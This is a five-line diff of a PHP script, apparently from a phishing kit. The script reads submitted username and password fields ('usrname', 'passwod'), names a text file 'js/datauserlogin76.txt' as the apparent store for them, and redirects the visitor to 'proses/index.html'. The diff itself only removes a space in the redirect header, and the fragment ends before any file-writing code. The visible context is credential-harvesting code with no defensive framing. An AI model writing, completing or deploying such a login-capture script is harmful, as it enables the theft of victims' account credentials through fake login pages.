@@ -1,5 +1,5 @@
 <?php
-header ("Location: proses/index.html");
+header ("Location:proses/index.html");
 $ADEx = "js/datauserlogin76.txt";
 $ADEy = $_POST['usrname'];
 $ADEz = $_POST['passwod'];
